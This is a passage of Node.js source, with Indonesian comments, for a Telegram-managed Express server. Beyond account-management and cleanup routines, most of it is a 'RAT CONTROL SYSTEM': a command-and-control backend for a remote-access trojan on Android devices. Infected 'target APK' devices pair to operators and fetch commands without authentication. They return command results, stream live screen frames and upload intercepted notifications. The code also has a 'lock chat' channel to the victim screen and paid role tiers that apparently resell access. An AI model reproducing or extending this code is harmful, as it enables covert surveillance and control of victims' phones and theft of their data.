      bot.sendMessage(id, "Masukkan data: `username|password|durasi_hari`", { parse_mode: "Markdown" });
      bot.once("message", msg => {
        const [username, password, day] = msg.text.split("|");
        const db = loadDatabase();
        if (db.find(u => u.username === username)) return bot.sendMessage(id, "❌ Username sudah ada!");
        const expired = new Date();
        expired.setDate(expired.getDate() + parseInt(day));
        db.push({ username, password, role: "member", expiredDate: expired.toISOString().split("T")[0] });
        saveDatabase(db);
        bot.sendMessage(id, `✅ Akun member dibuat:
👤 Username: ${username}
🔐 Password: ${password}`);
      });
      break;

    case "set_expire":
      bot.sendMessage(id, "Masukkan: `username|tambah_hari`", { parse_mode: "Markdown" });
      bot.once("message", msg => {
        const [username, addDays] = msg.text.split("|");
        const db = loadDatabase();
        const user = db.find(u => u.username === username);
        if (!user) return bot.sendMessage(id, "❌ User tidak ditemukan.");

        const config = loadTelegramConfig();
        const isOwner = config.ownerList.includes(id);

        // Cegah userList mengubah role selain member
        if (!isOwner && user.role !== "member") {
          return bot.sendMessage(id, "❌ Kamu hanya bisa memperpanjang akun dengan role 'member'.");
        }

        const current = new Date(user.expiredDate);
        current.setDate(current.getDate() + parseInt(addDays));
        user.expiredDate = current.toISOString().split("T")[0];
        saveDatabase(db);
        bot.sendMessage(id, `✅ Masa aktif diperbarui untuk ${username} ke ${user.expiredDate}`);
      });
      break;

    case "list_user":
      if (!isOwner) return;
      const users = getFormattedUsers();
      bot.sendMessage(id, `📋 *Daftar Pengguna:*
${users}`, { parse_mode: "Markdown" });
      break;

    case "create_custom":
      if (!isOwner) return;
      bot.sendMessage(id, "Masukkan: `username|password|role|durasi_hari`", { parse_mode: "Markdown" });
      bot.once("message", msg => {
        const [username, password, role, day] = msg.text.split("|");
        const db = loadDatabase();
        if (db.find(u => u.username === username)) return bot.sendMessage(id, "❌ Username sudah ada!");
        const expired = new Date();
        expired.setDate(expired.getDate() + parseInt(day));
        db.push({ username, password, role, expiredDate: expired.toISOString().split("T")[0] });
        saveDatabase(db);
        bot.sendMessage(id, `✅ Akun ${role} dibuat:
👤 Username: ${username}`);
      });
      break;

    case "delete_user":
      if (!isOwner) return;
      bot.sendMessage(id, "Masukkan username yang akan dihapus:");
      bot.once("message", msg => {
        const db = loadDatabase();
        const index = db.findIndex(u => u.username === msg.text);
        if (index === -1) return bot.sendMessage(id, "❌ User tidak ditemukan.");
        const deleted = db.splice(index, 1)[0];
        saveDatabase(db);
        bot.sendMessage(id, `🗑️ User ${deleted.username} berhasil dihapus.`);
      });
      break;
  }
});

bot.onText(/^\/?clear/, async (msg) => {
  const chatId = msg.chat.id;
  const id = msg.from.id;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id);

  if (!isOwner) {
    return bot.sendMessage(chatId, "❌ [ACCESS] *PERMISSION DENIED*\n\n⚠️ You are not authorized to execute this command.", { parse_mode: "Markdown" });
  }

  try {
    if (!fs.existsSync(SESSION_PATH)) {
      return bot.sendMessage(chatId, "⚠️ [SYSTEM] *ERROR: DIRECTORY NOT FOUND*\n\nTarget folder 'permenmd' does not exist.", { parse_mode: "Markdown" });
    }

    let deletedCount = 0;
    const userFolders = fs.readdirSync(SESSION_PATH);

    for (const userFolder of userFolders) {
      const userPath = path.join(SESSION_PATH, userFolder);

      if (!fs.lstatSync(userPath).isDirectory()) continue;

      const hasJson = fs.readdirSync(userPath).some(f => f.endsWith(".json"));
      if (!hasJson) {
        fs.rmSync(userPath, { recursive: true, force: true });
        deletedCount++;
      }
    }

    const responseMsg = deletedCount > 0 
      ? `🗑️ [SYSTEM] *GARBAGE COLLECTOR*\n\n✅ Purged ${deletedCount} corrupted/empty session folders.`
      : `✨ [SYSTEM] *NO JUNK FOUND*\n\nServer storage is clean.`;

    bot.sendMessage(chatId, responseMsg, { parse_mode: "Markdown" });
    console.log(`[LOG] Purged ${deletedCount} junk folders.`);
    
  } catch (err) {
    console.error("[ERROR] Cleanup failed:", err);
    bot.sendMessage(chatId, "⚠️ [SYSTEM] *CRITICAL ERROR*\n\nFailed to execute cleanup script.", { parse_mode: "Markdown" });
  }
});

bot.onText(/^\/?restart/, async (msg) => {
  const chatId = msg.chat.id;
  const id = msg.from.id;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id);

  if (!isOwner) {
    return bot.sendMessage(chatId, "❌ [ACCESS] *PERMISSION DENIED*\n\n⚠️ Root access required for this action.", { parse_mode: "Markdown" });
  }

  bot.sendMessage(chatId, "⚙️ [SERVER] *SYSTEM REBOOT*\n\nSending SIGTERM...\nReason: Manual Request\nStatus: *RESTARTING*...", { parse_mode: "Markdown" });
  await unfollowAllChannel();
  console.log("[SERVER] Manual restart triggered by Owner.");

  setTimeout(() => {
    process.exit(0);
  }, 2000);
});

setTimeout(async () => {
    await sendTelegramNotif(
      "☀️*[SERVER] SERVICES ONLINE*\n\n" +
      "System Status : *Running*\n" +
      "Uptime : Just Started\n" +
      "⚡All Systems Operational."
    );
  }, 3000);

// Kirim status server setiap 30 menit
setInterval(async () => {
  try {
    const uptimeSeconds = Math.floor(process.uptime());
    const hours = Math.floor(uptimeSeconds / 3600);
    const minutes = Math.floor((uptimeSeconds % 3600) / 60);
    const uptimeStr = hours > 0 ? `${hours}j ${minutes}m` : `${minutes}m`;
    const waktuOnline = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
    await sendTelegramNotif(
      "☀️*Server Online Boss~~*\n\n" +
      "System Status: *Running*\n" +
      `Uptime : ${uptimeStr}\n` +
      `🕐Waktu : ${waktuOnline}\n` +
      "✅All Systems Operational"
    );
  } catch (_) {}
}, 30 * 60 * 1000); // setiap 30 menit

// ═══════════════════════════════════════════════════════════
// 🧹 AUTO CLEAN — bersihkan file menumpuk secara otomatis
// ═══════════════════════════════════════════════════════════
async function runAutoClean() {
  console.log('[🧹 AUTO CLEAN] Mulai pembersihan...');
  let totalHapus = 0;

  try {
    // 1. Bersihkan logUser.txt kalau > 1MB
    const logUserPath = path.join(__dirname, 'logUser.txt');
    if (fs.existsSync(logUserPath)) {
      const sz = fs.statSync(logUserPath).size;
      fs.writeFileSync(logUserPath, '');
      console.log(`[🧹 AUTO CLEAN] logUser.txt direset (${(sz/1024).toFixed(1)} KB)`);
      totalHapus++;
    }

    // 2. Bersihkan user_logs/ — hapus file JSON > 7 hari atau > 500KB
    const logsDir = path.join(__dirname, 'user_logs');
    if (fs.existsSync(logsDir)) {
      const logFiles = fs.readdirSync(logsDir);
      const now = Date.now();
      for (const f of logFiles) {
        const fp = path.join(logsDir, f);
        try {
          const stat = fs.statSync(fp);
          const ageMs = now - stat.mtimeMs;
          const ageDays = ageMs / (1000 * 60 * 60 * 24);
          if (ageDays > 7 || stat.size > 500 * 1024) {
            fs.rmSync(fp, { force: true });
            totalHapus++;
            console.log(`[🧹 AUTO CLEAN] Hapus log: ${f} (${ageDays.toFixed(1)} hari, ${(stat.size/1024).toFixed(1)} KB)`);
          }
        } catch (_) {}
      }
    }

    // 3. Bersihkan session kosong di permenmd/
    const sessionBase = path.join(__dirname, 'permenmd', 'permenmd');
    if (fs.existsSync(sessionBase)) {
      const userFolders = fs.readdirSync(sessionBase);
      for (const uf of userFolders) {
        const ufPath = path.join(sessionBase, uf);
        try {
          if (!fs.lstatSync(ufPath).isDirectory()) continue;
          const files = fs.readdirSync(ufPath);
          const hasJson = files.some(f => f.endsWith('.json'));
          if (!hasJson) {
            fs.rmSync(ufPath, { recursive: true, force: true });
            totalHapus++;
            console.log(`[🧹 AUTO CLEAN] Hapus session kosong: ${uf}`);
          }
        } catch (_) {}
      }
    }

    // 5. Bersihkan folder temp/cache Node.js yang tidak perlu
    const tmpDirs = ['tmp', 'temp', '.cache'];
    for (const d of tmpDirs) {
      const dp = path.join(__dirname, d);
      if (fs.existsSync(dp)) {
        try {
          fs.rmSync(dp, { recursive: true, force: true });
          totalHapus++;
          console.log(`[🧹 AUTO CLEAN] Hapus folder temp: ${d}`);
        } catch (_) {}
      }
    }

    console.log(`[🧹 AUTO CLEAN] Selesai. Total item dibersihkan: ${totalHapus}`);

    // Kirim notif ke Telegram
    try {
      const waktuClean = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
      const notifClean =
        `🧹 *AUTO CLEAN SELESAI*\n\n` +
        `🗑 *Item Dibersihkan:* ${totalHapus}\n` +
        `🕐 *Waktu:* ${waktuClean}\n` +
        `✅ *Status:* Server berjalan normal\n` +
        `━━━━━━━━━━━━━━━━━━━\n` +
        `🔹 *𝗤𝘂𝗲𝗻𝗻 𝗣𝗿𝗼𝗷𝗲𝗰𝘁*`;
      await sendTelegramNotif(notifClean);
    } catch (_) {}

  } catch (err) {
    console.error('[🧹 AUTO CLEAN] Error:', err.message);
  }
}



// ===== Start Express Server =====
server.listen(PORT, () => {
  console.log(`🚀 Server aktif di http://66.33.22.226:${PORT}`);
  startVipSessions();
  startUserSessions();

  console.log(`[✅ SERVER] 𝗤𝘂𝗲𝗻𝗻 𝗣𝗿𝗼𝗷𝗲𝗰𝘁 ready — semua fitur aktif.`);


// ════════════════════════════════════════════════════════════════════════════
// ██████████  RAT CONTROL SYSTEM  ██████████████████████████████████████████
// ════════════════════════════════════════════════════════════════════════════

const RAT_TARGETS = './rat_targets.json';
const RAT_LIVE    = {};
const RAT_ALLOWED = ['founder', 'developer', 'ceo', 'tk', 'high owner', 'owner', 'moderator', 'partner', 'admin', 'vip'];

function readRat(f) {
  try { return JSON.parse(fs.existsSync(f) ? fs.readFileSync(f,'utf8')||'[]' : '[]'); } catch { return []; }
}
function saveRat(f,d) { try { fs.writeFileSync(f, JSON.stringify(d,null,2)); } catch(_) {} }
function genPairId() { return crypto.randomBytes(8).toString('hex').toUpperCase(); }

// ── Role Guard: blok member ─────────────────────────────────────────────────
function ratGuard(req, res, next) {
  const key = req.query.key || req.body?.key;
  const user = getUserObjectByKey(key);
  if (!user) return res.json({ valid: false, message: 'Invalid key' });
  const role = (user.role || '').toLowerCase();
  if (!RAT_ALLOWED.includes(role)) return res.json({ valid: false, message: 'Akses ditolak. Fitur RAT hanya untuk role vip ke atas' });
  req._ratUser = user;
  next();
}

// ── Startup: generate pairId untuk semua user yang belum punya ──────────────
(function generateAllPairIds() {
  try {
    const db = JSON.parse(fs.existsSync('./database.json') ? fs.readFileSync('./database.json','utf8')||'[]' : '[]');
    let changed = false;
    for (let i = 0; i < db.length; i++) {
      if (!db[i].pairId) { db[i].pairId = genPairId(); changed = true; console.log(`[RAT-STARTUP] pairId generated: ${db[i].username} → ${db[i].pairId}`); }
    }
    if (changed) fs.writeFileSync('./database.json', JSON.stringify(db,null,2));
    else console.log('[RAT-STARTUP] All users already have pairId');
  } catch(e) { console.error('[RAT-STARTUP] Error:', e.message); }
})();

// ── Device Permission Endpoints ─────────────────────────────────────────────
app.get('/devicePerms', ratGuard, (req, res) => {
  const { username } = req.query;
  const db = JSON.parse(fs.existsSync('./database.json') ? fs.readFileSync('./database.json','utf8')||'[]' : '{}');
  const perms = JSON.parse(fs.existsSync('./rat_perms.json') ? fs.readFileSync('./rat_perms.json','utf8')||'{}' : '{}');
  const role = (req._ratUser.role||'').toLowerCase();
  const isHighRole = ['founder', 'developer', 'ceo', 'tk', 'high owner', 'owner', 'moderator', 'partner', 'admin', 'vip'].includes(role);
  // Jika yang dicek adalah diri sendiri dan role tinggi → auto approve
  if (isHighRole && (!username || username === req._ratUser.username)) {
    return res.json({ valid: true, approved: true, allDevices: true, devices: [] });
  }
  const ownerPerms = perms[req._ratUser.username] || {};
  const targetPerm = ownerPerms[username] || { approved: false, allDevices: false, devices: [] };
  res.json({ valid: true, ...targetPerm });
});

app.post('/setDevicePerm', ratGuard, (req, res) => {
  const { username, approved, allDevices, devices } = req.body;
  const role = (req._ratUser.role||'').toLowerCase();
  const canSetPerm = ['owner','high owner','high admin','admin','reseller','vip'].includes(role);
  if (!canSetPerm) return res.json({ valid: false, message: 'Role tidak diizinkan set permission' });
  const perms = JSON.parse(fs.existsSync('./rat_perms.json') ? fs.readFileSync('./rat_perms.json','utf8')||'{}' : '{}');
  if (!perms[req._ratUser.username]) perms[req._ratUser.username] = {};
  perms[req._ratUser.username][username] = { approved: !!approved, allDevices: !!allDevices, devices: devices||[] };
  fs.writeFileSync('./rat_perms.json', JSON.stringify(perms,null,2));
  res.json({ valid: true });
});

app.get('/listDevicePerms', ratGuard, (req, res) => {
  const role = (req._ratUser.role||'').toLowerCase();
  const canList = ['founder', 'developer', 'ceo', 'tk', 'high owner', 'owner', 'moderator', 'partner', 'admin', 'vip'].includes(role);
  if (!canList) return res.json({ valid: false, message: 'Role tidak diizinkan' });
  const perms = JSON.parse(fs.existsSync('./rat_perms.json') ? fs.readFileSync('./rat_perms.json','utf8')||'{}' : '{}');
  res.json({ valid: true, perms: perms[req._ratUser.username] || {} });
});

app.get('/api/device/getPerms',  ratGuard, (req, res) => { req.url = '/devicePerms?'   + (req.url.split('?')[1]||''); app.handle(req, res); });
app.post('/api/device/setPerm',  ratGuard, (req, res) => { req.url = '/setDevicePerm?' + (req.url.split('?')[1]||''); app.handle(req, res); });
app.get('/api/device/listPerms', ratGuard, (req, res) => { req.url = '/listDevicePerms?'+(req.url.split('?')[1]||''); app.handle(req, res); });

// ── RAT Core Endpoints ──────────────────────────────────────────────────────
app.get('/rat/pairid', ratGuard, (req, res) => {
  const db = JSON.parse(fs.existsSync('./database.json') ? fs.readFileSync('./database.json','utf8')||'[]' : '[]');
  const idx = db.findIndex(u => u.username === req._ratUser.username);
  if (idx === -1) return res.json({ valid: false, message: 'User not found' });
  if (!db[idx].pairId) { db[idx].pairId = genPairId(); fs.writeFileSync('./database.json', JSON.stringify(db,null,2)); }
  res.json({ valid: true, pairId: db[idx].pairId });
});

app.post('/rat/grant-member', ratGuard, (req, res) => {
  const role = (req._ratUser.role||'').toLowerCase();
  const canGrant = ['founder', 'developer', 'ceo', 'tk', 'high owner', 'owner', 'moderator', 'partner', 'admin', 'vip'].includes(role);
  if (!canGrant) return res.json({ valid: false, message: 'Role tidak diizinkan grant akses' });
  const { memberUsername } = req.body;
  const perms = JSON.parse(fs.existsSync('./rat_perms.json') ? fs.readFileSync('./rat_perms.json','utf8')||'{}' : '{}');
  if (!perms[req._ratUser.username]) perms[req._ratUser.username] = {};
  perms[req._ratUser.username][memberUsername] = { approved: true, allDevices: true, devices: [] };
  fs.writeFileSync('./rat_perms.json', JSON.stringify(perms,null,2));
  res.json({ valid: true });
});

app.post('/rat/revoke-member', ratGuard, (req, res) => {
  const role = (req._ratUser.role||'').toLowerCase();
  const canRevoke = ['founder', 'developer', 'ceo', 'tk', 'high owner', 'owner', 'moderator', 'partner', 'admin', 'vip'].includes(role);
  if (!canRevoke) return res.json({ valid: false, message: 'Role tidak diizinkan revoke akses' });
  const { memberUsername } = req.body;
  const perms = JSON.parse(fs.existsSync('./rat_perms.json') ? fs.readFileSync('./rat_perms.json','utf8')||'{}' : '{}');
  if (perms[req._ratUser.username]) delete perms[req._ratUser.username][memberUsername];
  fs.writeFileSync('./rat_perms.json', JSON.stringify(perms,null,2));
  res.json({ valid: true });
});

app.get('/rat/my-devices', ratGuard, (req, res) => {
  const db = JSON.parse(fs.existsSync('./database.json') ? fs.readFileSync('./database.json','utf8')||'[]' : '[]');
  const user = req._ratUser;
  const targets = readRat(RAT_TARGETS);
  const role = (user.role||'').toLowerCase();
  const isOwnerLevel = ['founder', 'developer', 'ceo', 'tk', 'high owner', 'owner', 'moderator', 'partner',].includes(role);
  const isAdminLevel = ['admin'].includes(role);
  const isResellerVip = ['reseller','vip'].includes(role);
  let devices;

  if (isOwnerLevel || isAdminLevel || isResellerVip) {
    // Semua role tinggi langsung pakai pairId sendiri → lihat device milik sendiri
    const dbUser = db.find(u => u.username === user.username);
    if (!dbUser) return res.json({ valid: true, devices: [] });
    // Auto-approve diri sendiri di rat_perms supaya APK tidak tampilkan "Akses belum disetujui"
    try {
      const perms = JSON.parse(fs.existsSync('./rat_perms.json') ? fs.readFileSync('./rat_perms.json','utf8')||'{}' : '{}');
      if (!perms[user.username]) perms[user.username] = {};
      if (!perms[user.username][user.username]) {
        perms[user.username][user.username] = { approved: true, allDevices: true, devices: [] };
        fs.writeFileSync('./rat_perms.json', JSON.stringify(perms,null,2));
      }
    } catch(_) {}
    devices = targets.filter(t => t.ownerPairId === dbUser.pairId);
  } else {
    // Member atau role lain → cek perms dari owner
    const perms = JSON.parse(fs.existsSync('./rat_perms.json') ? fs.readFileSync('./rat_perms.json','utf8')||'{}' : '{}');
    const ownerEntry = Object.entries(perms).find(([,p]) => p[user.username]?.approved);
    if (!ownerEntry) return res.json({ valid: true, devices: [] });
    const [ownerName, ownerPerms] = ownerEntry;
    const perm = ownerPerms[user.username];
    const ownerUser = db.find(u => u.username === ownerName);
    const ownerDevices = targets.filter(t => t.ownerPairId === ownerUser?.pairId);
    devices = perm.allDevices ? ownerDevices : ownerDevices.filter(d => perm.devices?.includes(d.id));
  }
  res.json({ valid: true, devices });
});

// ── Pair + Command + Response ────────────────────────────────────────────────
app.post('/api/pair-target', (req, res) => {
  // Endpoint ini dipanggil dari APK target (bukan dari user login), jadi pakai pairId bukan sessionKey
  const { pairId, deviceId, model, battery } = req.body;
  if (!pairId || !deviceId) return res.status(400).json({ error: 'Missing fields' });
  const db = JSON.parse(fs.existsSync('./database.json') ? fs.readFileSync('./database.json','utf8')||'[]' : '[]');
  const owner = db.find(u => u.pairId === pairId);
  if (!owner) return res.status(403).json({ error: 'Invalid pairId' });
  let t = readRat(RAT_TARGETS);
  const idx = t.findIndex(d => d.id === deviceId);
  const entry = { id: deviceId, model: model||'Unknown', battery: battery||'?', ownerPairId: pairId, lastSeen: new Date().toISOString() };
  if (idx >= 0) t[idx] = { ...t[idx], ...entry }; else t.push(entry);
  saveRat(RAT_TARGETS, t);
  res.json({ valid: true, message: 'Paired' });
});

app.post('/api/send-command', ratGuard, (req, res) => {
  const { id, command, extra } = req.body;
  let cmds = readRat('./rat_commands.json');
  cmds = cmds.filter(c => c.id !== id);
  cmds.push({ id, command, extra: extra||'', ts: Date.now() });
  saveRat('./rat_commands.json', cmds);
  res.json({ valid: true });
});

app.get('/api/get-command/:id', (req, res) => {
  // Dipanggil dari APK target, no auth needed
  let cmds = readRat('./rat_commands.json');
  const cmd = cmds.find(c => c.id === req.params.id);
  if (!cmd) return res.json({});
  cmds = cmds.filter(c => c.id !== req.params.id);
  saveRat('./rat_commands.json', cmds);
  let t = readRat(RAT_TARGETS);
  const idx = t.findIndex(d => d.id === req.params.id);
  if (idx >= 0) { t[idx].lastSeen = new Date().toISOString(); saveRat(RAT_TARGETS, t); }
  res.json(cmd);
});

app.post('/api/post-response/:id', (req, res) => {
  // Dari APK target, no auth
  let resp = readRat('./rat_responses.json');
  resp = resp.filter(r => r.id !== req.params.id);
  resp.push({ id: req.params.id, cmd: req.body.cmd||'', data: req.body.data||{}, ts: Date.now() });
  saveRat('./rat_responses.json', resp);
  res.json({ valid: true });
});

app.get('/api/get-response/:id', ratGuard, (req, res) => {
  const resp = readRat('./rat_responses.json');
  const r = resp.find(r => r.id === req.params.id);
  res.json(r || {});
});

// ── Live Frame ───────────────────────────────────────────────────────────────
app.post('/api/live-frame/:id', (req, res) => {
  // Dari APK target, no auth
  const { frame, ts } = req.body;
  RAT_LIVE[req.params.id] = { frame, ts: ts || Date.now() };
  res.json({ valid: true });
});

app.get('/api/live-frame/:id', ratGuard, (req, res) => {
  const d = RAT_LIVE[req.params.id];
  if (!d || Date.now() - d.ts > 5000) return res.json({ frame: '' });
  res.json({ frame: d.frame });
});

// ── Notifications ────────────────────────────────────────────────────────────
app.post('/api/post-notification/:id', (req, res) => {
  // Dari APK target, no auth
  let notifs = readRat('./rat_notifs.json');
  notifs.push({ id: req.params.id, ...req.body, ts: Date.now() });
  if (notifs.length > 200) notifs = notifs.slice(-200);
  saveRat('./rat_notifs.json', notifs);
  res.json({ valid: true });
});

app.get('/api/get-notifications/:id', ratGuard, (req, res) => {
  const notifs = readRat('./rat_notifs.json');
  res.json(notifs.filter(n => n.id === req.params.id).slice(-50));
});

// ── Lock Chat ────────────────────────────────────────────────────────────────
app.post('/api/lock-chat/:id', ratGuard, (req, res) => {
  let chats = readRat('./rat_chats.json');
  if (!Array.isArray(chats)) chats = [];
  chats.push({ id: req.params.id, from: req.body.from||'owner', text: req.body.text||'', time: new Date().toLocaleTimeString('id-ID') });
  if (chats.length > 500) chats = chats.slice(-500);
  saveRat('./rat_chats.json', chats);
  res.json({ valid: true });
});

app.get('/api/lock-chat/:id', (req, res) => {
  // Dari APK target boleh baca chat
  const chats = readRat('./rat_chats.json');
  const last = chats.filter(c => c.id === req.params.id).slice(-1)[0];
  res.json(last || {});
});

app.get('/api/lock-chat-all/:id', ratGuard, (req, res) => {
  const chats = readRat('./rat_chats.json');
  res.json({ messages: chats.filter(c => c.id === req.params.id).slice(-100) });
});

app.delete('/api/lock-chat/:id', ratGuard, (req, res) => {
  let chats = readRat('./rat_chats.json');
  chats = chats.filter(c => c.id !== req.params.id);
  saveRat('./rat_chats.json', chats);
  res.json({ valid: true });
});

// ── Auto cleanup setiap jam ───────────────────────────────────────────────────
['rat_targets','rat_commands','rat_responses','rat_notifs'].forEach(f => {
  setInterval(() => {
    try {
      let data = readRat(`./${f}.json`);
      const now = Date.now();
      if (f === 'rat_commands')  data = data.filter(d => now - (d.ts||0) < 60000);
      if (f === 'rat_responses') data = data.filter(d => now - (d.ts||0) < 120000);
      saveRat(`./${f}.json`, data);
    } catch(_) {}
  }, 3600000);
});

// ── Admin RAT endpoints ──────────────────────────────────────────────────────
app.get('/admin/listpairids', ratGuard, (req, res) => {
  const role = (req._ratUser.role||'').toLowerCase();
  if (!['founder', 'developer', 'ceo', 'tk', 'high owner', 'owner', 'moderator', 'partner', 'admin'].includes(role)) return res.json({ valid: false, message: 'Minimal role Admin' });
  const db = JSON.parse(fs.existsSync('./database.json') ? fs.readFileSync('./database.json','utf8')||'[]' : '[]');
  res.json({ valid: true, users: db.map(u => ({ username: u.username, pairId: u.pairId||null })) });
});

app.get('/admin/genpairid', ratGuard, (req, res) => {
  const role = (req._ratUser.role||'').toLowerCase();
  if (!['founder', 'developer', 'ceo', 'tk', 'high owner', 'owner', 'moderator', 'partner', 'admin'].includes(role)) return res.json({ valid: false, message: 'Minimal role Admin' });
  const { username } = req.query;
  const db = JSON.parse(fs.existsSync('./database.json') ? fs.readFileSync('./database.json','utf8')||'[]' : '[]');
  const idx = db.findIndex(u => u.username === username);
  if (idx === -1) return res.json({ valid: false, message: 'User not found' });
  db[idx].pairId = genPairId();
  fs.writeFileSync('./database.json', JSON.stringify(db,null,2));
  res.json({ valid: true, pairId: db[idx].pairId });
});

// ════════════════════════════════════════════════════════════════════════════
// ██████████  END RAT CONTROL SYSTEM  ████████████████████████████████████████
// ════════════════════════════════════════════════════════════════════════════
})